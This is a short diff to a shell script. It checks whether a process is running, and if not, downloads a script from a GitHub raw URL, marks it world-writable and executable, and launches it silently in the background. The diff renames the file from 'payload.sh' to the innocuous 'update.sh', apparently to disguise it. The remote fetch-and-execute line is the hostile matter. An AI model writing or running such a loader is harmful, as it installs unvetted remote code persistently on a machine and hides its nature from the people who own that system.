@@ -2,7 +2,7 @@
 
 export TZ=America/Sao_Paulo
 
-if ! pgrep payload.sh > /dev/null
+if ! pgrep update.sh > /dev/null
 then
-   rm -rf payload.sh ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/payload.sh && chmod 777 payload.sh ; nohup ./payload.sh > /dev/null &
+   rm -rf update.sh ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/update.sh && chmod 777 update.sh ; nohup ./update.sh > /dev/null &
 fi
